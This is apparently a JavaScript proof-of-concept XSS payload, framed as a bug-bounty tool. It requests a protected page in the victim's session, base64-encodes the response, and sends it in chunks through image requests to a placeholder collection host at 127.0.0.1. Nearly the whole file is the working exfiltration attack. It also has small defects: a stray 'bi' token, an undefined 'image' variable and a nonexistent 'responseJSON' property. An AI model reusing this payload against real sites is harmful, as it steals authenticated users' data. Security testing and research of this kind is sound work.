// Proof-of-Concept: Data Exfiltration through XSS Payload
// Made from C0dy 
// used in bug bounty hunting web enviroment 

function read_body(xhr) {
    var data;

    // Determine the response type and retrieve data accordingly
    if (!xhr.responseType || xhr.responseType === "text") {bi
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }
    return data;
}

function stealData() {
    var uri = "/app/superSecretData.html";

    xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.send(null);

    xhr.onreadystatechange = function () {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            // The response containing the data has been received

            // Prepare the data for exfiltration
            var exfilChunkSize = 2000;
            var exfilData = btoa(read_body(xhr));
            var numFullChunks = Math.floor(exfilData.length / exfilChunkSize);
            var remainderBits = exfilData.length % exfilChunkSize;

            // Exfiltrate the data in chunks
            for (var i = 0; i < numFullChunks; i++) {
                console.log("Processing chunk " + i);

                var exfilChunk = exfilData.slice(
                    exfilChunkSize * i,
                    exfilChunkSize * (i + 1)
                );

                // Use an image load to exfiltrate the data
                var downloadImage = new Image();
                downloadImage.onload = function () {
                    // Image source contains the exfiltrated data
                    image.src = this.src;
                };

                // Asynchronously load an image with the data as its name
                downloadImage.src =
                    "http://127.0.0.1/exfil/" + i + "/" + exfilChunk + ".jpg";
            }

            // Handle the last chunk separately
            var exfilChunk = exfilData.slice(
                exfilChunkSize * numFullChunks,
                exfilChunkSize * numFullChunks + remainderBits
            );
            var downloadImage = new Image();
            downloadImage.onload = function () {
                // Image source contains the last exfiltrated data chunk
                image.src = this.src;
            };

            // Asynchronously load an image for the last chunk
            downloadImage.src =
                "http://127.0.0.1/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
            console.log("Exfiltration completed.");
        }
    };
}

stealData();
